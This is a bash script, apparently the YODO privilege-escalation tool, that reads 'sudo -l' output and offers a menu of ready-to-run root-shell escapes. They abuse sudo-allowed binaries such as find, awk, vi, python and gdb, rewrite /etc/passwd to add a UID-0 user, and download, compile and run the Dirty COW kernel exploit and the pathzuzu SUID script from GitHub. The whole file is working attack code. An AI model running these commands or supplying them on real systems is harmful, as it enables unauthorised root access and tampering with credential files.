#!/bin/bash

clear
echo -e "\e[1;94m=======================================================================\e[m"
cat << "img"
                                    ....                                        
                                ..  .77.                                        
                                Z.  ,77?                                        
                               .Z$.....,?+?.                                    
                       ....     $?Z.77+??I..                                    
                       .7I.  .....~.77:=I..Z.....                               
                       .77?  ..7?.?.=7....ZO..~..                               
                   ..  ..7$7.=7I$.??+.$$~.==.??..    .~..                       
                  .$Z$..Z...77.$7..+=?,.I?=.++.+~....?7... ..                   
                   ..?.I7:..77....$$IO++??=...7$.Z$..7$?..7$                    
                   .77.+:$?7..Z$.?,.~M,?,..77. .ZZ...,,.$77..                   
              ..$=. +7$7...77+$I? ???M.$.I:~I?..,$..7$.Z7=.                     
              ..Z7Z.=..~,.....,=O...~MI=~=...O$.~...?7..:$7I.                   
              ...Z.Z.?I?.=:.??...??..M.ZZ.. ,.~Z$I,.,7...I.,....                
              ..,......:.~~.?.?+..?~7M..,?...==.~7..:.Z$+.. ....                
                .?7..??,...Z.=?:.I7..M. D$Z?$+=.:... +Z+,....77.....            
          .$~...:+O7$.+I+$=~:.=...7,:M.M~7 ..Z$..+~:?...7?$.?$~.OZZ$Z...        
          ..$I7=?I?,..7?$$M..=:..?...MM.7$,.7...:??....,7I...?..Z$Z$$$.         
          ...,=~.?.+.7.....8.$...?,+~MD+I...$7.I.O$Z$.. D8..I=$:$,....          
            .$~+$....7Z.$$$7M.?+=$..,M8 .Z.I., M,ZZZ.MM..7+?+77..7..            
              .. ...$.MM.....MZ$~Z:Z,MM.O$,$7,MZ .NMM.~77.+?+.7...              
                 I7~Z....MM .M7Z....?MMO,Z..$.M 8MM ..=77I=~?..I~.              
            .$7I7?.+...$...:MMM. .$=OMM?Z,,..MMMMMMMMMMMMMI..=Z$+...            
            ..?7I$$I.+.O:Z,=.8MN.$??MMM..$7.MMM...Z.$.+,?.Z.Z=..$77$..          
                   ...?OMMMMMMDMM7$IMMM ..MMM..,$7.Z$Z..??I$,Z.?I...            
                   7?:++.??=...~8D..MMM MMMM.???.$...~$.....$Z..7$..            
                   .....??,::Z$::MM.MMMMMM,,=II?II,.....   ...... ..            
                        ,...?:...IOOO8OO8 ?I,:        ,.                        
                            .     88OOOO. :.                        
                           .:,,,:,.8OOOO :.                        
                           .,....,. OO8M:.. :.                        
                            ..... . 8OMN.:.                        
                                   .ONM8::.                        
                    :8MDO  8MDO   :8MDO,    DMO8M       :8MDO,               
                      DMO  DMO  .+8D   MO,  DMO  8M   .+8D   MO,            
                        O  O    $O     OMM  DMO   8M  $O     OMM     
                      :8MDO    .OO     O8   DMO  8M  .OO     O8M,
                      DMO         .8°O88    DMO8M       .8°O88
                                  .8OOOO. .           :.                    
                       ...         OOOOO,.                       
        ..  . ......    .........,.MMMMMMI.,........... .                       
          .     .. ,INMMMMMMMMMMMMMMMMMMIZMMMMMMMN7=..... . . .  ..             
                 .  =. ......~?ZMMMIM.MM NMMN...   .......=+ . .                
                 .  .. .  .$...MM,.MM ..MD....MMMMO... .. ..,..~                
                 ,     .   . :MM.  MM  .ZMM?.. .$M...7MD77ZD+.,.                
              .    .  :=D7Z8MM.   .M:   .. .MD.. .7D~. ..,.O. ..                
              .. $..=.    ?M?. .. .M.  ..M...IMM  .,..M ..   ..:..              
              . ..... . .MM.Z   D ,M+. . :+..M. N+ . . ..? . ....               
                       .M7=.+.=.~.:MM.    .  , . .M..   .  ,.                   
                      .N?.8. ~  ..,M 8. ... . M. . M.      . . .                
                  . ..NM .$..    .MM...  .    ,+.:: 8 .                         
                 . =M.M ..?..    ..M  M .   . .M .I,.M.                         
            ,~~  .   .I...8..    M M  .8,.     Z.... b3                        
               .     +.   +. .. : .M....O.    ...  . D.=.                       
                     O.  .~,    $. 8     .    .~.  ..+ .                        
                     8.   ...   M. ,..   , +   .I.. .,..7                       
                     O.    .    I   I     ..  .   .  ....                       
                     +.      .  :  .M.                                          
                      .         .   M                                           
                     ..         .   ..                                          
                     .          .                                               
                      ~.             N.                                         
                     
img
echo -e "\e[1;94m=======================================================================\e[m"
echo -e "\e[1;46m Possible exploitable options (dirtyc0w | VSP | Pathzuzu excluded):\e[m \e[1;91m"
# Check if possible
sudo -l > check.txt
# Value check
cFind=$( grep -ic "find" check.txt )
cAwk=$( grep -ic "awk" check.txt )
cNmap=$( grep -ic "nmap" check.txt )
cVi=$( grep -ic "vi" check.txt )
cPython=$( grep -ic "python" check.txt )
cIrb=$( grep -ic "irb" check.txt )
cLess=$( grep -ic "less" check.txt )
cMore=$( grep -ic "more" check.txt )
cMan=$( cat check.txt | grep -v commands check.txt | grep -ic "man" )
cGdb=$( grep -ic "gdb" check.txt )
cRuby=$( grep -ic "ruby" check.txt )
cB3=$( grep -ic "NOPASSWD" check.txt )
cPerl=$( grep -ic "perl" check.txt )
cTee=$( grep -ic "tee" check.txt )	
# Function check
if [ $cFind -gt 0 ]; then
	echo " [·] find"
elif [ $cAwk -gt 0 ]; then
	echo " [·] awk"
elif [ $cNmap -gt 0 ]; then
	echo " [·] nmap"
elif [ $cVi -gt 0 ]; then
	echo " [·] vi"
elif [ $cPython -gt 0 ]; then
	echo " [·] python"
elif [ $cIrb -gt 0 ]; then
	echo " [·] irb"
elif [ $cLess -gt 0 ]; then
	echo " [·] less"
elif [ $cMore -gt 0 ]; then
	echo " [·] more"
elif [ $cMan -gt 0 ]; then
	echo " [·] man"
elif [ $cGdb -gt 0 ]; then
	echo " [·] gdb"
elif [ $cRuby -gt 0 ]; then
	echo " [·] ruby"
elif [ $cB3 -gt 0 ]; then
	echo " [·] b3"
elif [ $cPerl -gt 0 ]; then
	echo " [·] perl"
elif [ $cTee -gt 0 ]; then
	echo " [·] tee"
else 
	echo -e " good luck \e[m"
fi
rm check.txt
# MENU
echo
echo -e "\e[1;92m Select From the menu:"
echo 
echo "   1) Find                8) More *                15) Tee"
echo "   2) AWK                 9) Man  *                16) VSP °"
echo "   3) Nmap               10) Dirtyc0w °            17) Pathzuzu °"
echo "   4) Vi                 11) Gdb                   18) Credits"
echo "   5) Python             12) Ruby                  19) Update"
echo "   6) Irb                13) b3                    99) Exit"
echo "   7) Less *             14) Perl"
echo -e "\e[m"
echo " VSP = Vulnerable Script Permissions"
echo " Pathzuzu = SUID exploitation threw Path vulnerability"
echo -e "\e[1;93m * user interaction \e[m"
echo -e "\e[1;93m ° sudo not required \e[m"
read -p " Enter Number: " number
# Has the number been added?
if [ -z $number ]; then
	echo " Not entered"
# FIND
elif [ $number = 1 ]; then
	sudo find . -exec bash -i \;
# AWK
elif [ $number = 2 ]; then
	sudo awk 'BEGIN {system("/bin/bash")}'
# NMAP
elif [ $number = 3 ]; then
	echo "os.execute('/bin/bash')" > x.nse
	sudo nmap –script=x.nse
	rm x.nse
# VI
elif [ $number = 4 ]; then
	sudo vi -c ':shell'
# PYTHON
elif [ $number = 5 ]; then
	echo "import os" >> python
	echo "os.system('/bin/bash')" >> python
	sudo python python
	rm python
# IRB
elif [ $number = 6 ]; then
	echo "exec '/bin/bash'" > irb.rb
	sudo irb -r ./irb.rb
	rm irb.rb
# LESS
elif [ $number = 7 ]; then	
	echo "I need you to help me here!"
	echo 'when the LESS page appears, please type "v" (without quotes)'
    echo 'and press Enter and then type ":shell" and press Enter'
	echo "it works only if vi is the default editor"
	read -p "Press Enter to continue..."
	sudo less $0
# MORE
elif [ $number = 8 ]; then	
	echo "I need you to help me here!"
	echo 'when the MORE page appears, please type "!bash" (without quotes) and press Enter'
	read -p "Press Enter to continue..."
	sudo more $0
# MAN
elif [ $number = 9 ]; then	
	echo "I need you to help me here!"
	echo 'when the MAN page appears, please type "!bash" (without quotes) and press Enter'
	read -p "Press Enter to continue..."
	sudo man man
# DIRTYC0W
elif [ $number = 10 ]; then
	clear
	wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
	sleep 1
	gcc -pthread dirtyc0w.c -o dirtycow
	sleep 1
	./dirtycow  /etc/passwd aaa::0:0:,,,:/home/b3:/bin/bash &
	sleep 2
	sudo -S -u  aaa useradd -ou 0 -g 0 yodo
	sleep 1
	./dirtycow /etc/passwd root:x:0:0:root:/root:/bin/bash &
	sleep 2
	rm dirtyc0w.c
	rm dirtycow
	sudo -S -u yodo find . -exec bash -i \;
# GDB
elif [ $number = 11 ]; then
	echo '!/bin/bash' > gdb
	sudo gdb -batch -x gdb
	rm gdb
# RUBY
elif [ $number = 12 ]; then
	echo "exec '/bin/bash';" > rb.rb
	sudo ruby rb.rb
	rm rb.rb
# B3
elif [ $number = 13 ]; then	
	a=$(sudo -l | grep NOPASSWD | head -n 1 | cut -d ":" -f2)
	sudo mv $a{,.back}
	sudo ln -s /bin/bash $a
	sudo $a
	sudo rm $a
	sudo mv $a.back $a
# PERL
elif [ $number = 14 ]; then
	echo "exec '/bin/bash';" > pl.pl
	sudo perl pl.pl
	rm pl.pl
# TEE
elif [ $number = 15 ]; then	
	user=123::0:0:,,,:/home/b3:/bin/bash
	root=root:x:0:0:root:/root/bin/bash
	read -p "A new user named yodo with root privileges will be created | Press Enter to continue..."
	cat /etc/passwd  > list.txt
	sed "1s|.*|$user|" list.txt | sudo tee /etc/passwd
	sudo -S -u 123 useradd -ou 0 -g 0 yodo
	sed "1s|.*|$root|" /etc/passwd > list.txt
	sudo -S -u yodo mv list.txt /etc/passwd
	sudo -S -u yodo "/bin/bash"
# VSP
elif [ $number = 16 ]; then
	PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

	echo "  Checking for user-writable files and directories..."

	VICTORY=1
	for POTENTIAL in `sudo -l | awk '{for (i = 1; i <= NF; i++) print $i}'|grep -e ^/|sed -e "s/,$//"`
	do
    	   >&2 echo "    Testing [${POTENTIAL}]..."
           # if we can write to this, it's game over
	       sudo -l $POTENTIAL > /dev/null 2> /dev/null
	       if [ $? -eq 0 -a -w $POTENTIAL -a -x $POTENTIAL ] ; then
	                 echo "   [*] $POTENTIAL is writable and executable, likely privesc issue for command ${POTENTIAL}"
 	                 VICTORY=0
 	       fi
 	       # if we can't write to the executable file itself, maybe we can write to one of its parent directories
 	       DIRNAME=`dirname $POTENTIAL`
 	       while [ ! -z "${DIRNAME}" ] ;
  	       do
      	            >&2 echo "    Testing [${DIRNAME}]..."
      	            if [ -w ${DIRNAME} ] ; then
      	                    echo "  [*] ${DIRNAME} is writable, likely privesc issue for command ${POTENTIAL}"
      	                    VICTORY=0
    	                    break
      	            fi
      	            OLD_DIRNAME=${DIRNAME}
      	            DIRNAME=`dirname ${DIRNAME}`
      	            if [ "x${OLD_DIRNAME}" = "x${DIRNAME}" ] ; then
      	                    #we've reached /
			    echo -e "\e[1;91m   BAD LUCK\e[m"
      	                    break
      	            fi
       	  done
	done
exit $VICTORY
# PATHZUZU
elif [ $number = 17 ]; then
	# Download pathzuzu
	pzlic=LICENCE-PATHZUZU
	if [ ! -f $pzlic ]; then
		wget https://raw.githubusercontent.com/ShotokanZH/Pa-th-zuzu/master/LICENSE -O LICENCE-PATHZUZU
		wget https://raw.githubusercontent.com/ShotokanZH/Pa-th-zuzu/master/pathzuzu.sh
		chmod +x pathzuzu.sh
	fi
	read -p " Specify Path ('/' to find them all) : " pathzuzupath
	res=$(LC_ALL=C find $pathzuzupath -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{print $9}')
	for r in $res
		do echo $r
	done
		read -p "Test them all? (yes/no) : " pathResults
			if [ -z $pathResults ]; then
				echo "I did not understand"
			elif [ "$pathResults" == "yes" ] || [ "$pathResults" == "y" ]; then
				for r in $res
					do echo "Testing $r..."
					./pathzuzu.sh -e "whoami" -u 0 $r > /dev/null 
					if [ $? -eq 0 ]; then
						echo -e "$r \e[1;92mworked!\e[m"
						while [ true ]
							do read -p "Enter command: " p
							output=$(LC_ALL=C find $pathzuzupath -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{print $9}')
							./pathzuzu.sh -e "$p" -u 0 $r | sed -n '12,$p' | head -n -10
						done
						exit 0
					fi
				done
				echo "Sorry :("
				exit 1				
			elif [ "$pathResults" == "no" ] || [ "$pathResults" == "n" ]; then
				read -p "Specify which one : " specificPath
				./pathzuzu.sh -e "whoami" -u 0 $specificPath > /dev/null 
				if [ $? -ne 0 ]; then
					echo "It doesn't work"
					exit 1
				fi
				echo -e "\e[1;92mworked!\e[m"
				while [ true ]
				do read -p "Enter command: " p
					./pathzuzu.sh -e "$p" -u 0 $r | sed -n '12,$p' | head -n -10
				done
			
			else
				echo " I did not understand"
			fi

# CREDITS
elif [ $number = 18 ]; then
	echo
	echo "  YODO version 1.2.0"
	echo "  Created by: b3rito"
	echo "  Report bugs: b3rito@mes3hacklab.org"
	echo "  Homepage: http://mes3hacklab.org/yodo.html"
	echo "  bug reported by klez | rudeyak"
	echo "  fix by klez | rudeyak"
	echo "  contributor: rudeyak | klez"
	echo "  ascii art by m"
	echo
# UPDATE
elif [ $number = 19 ]; then
	wget "https://raw.githubusercontent.com/b3rito/yodo/master/yodo.sh" -O yodo.sh
# EXIT
elif [ $number = 99 ]; then
	exit
else
	echo " Not found"
fi;
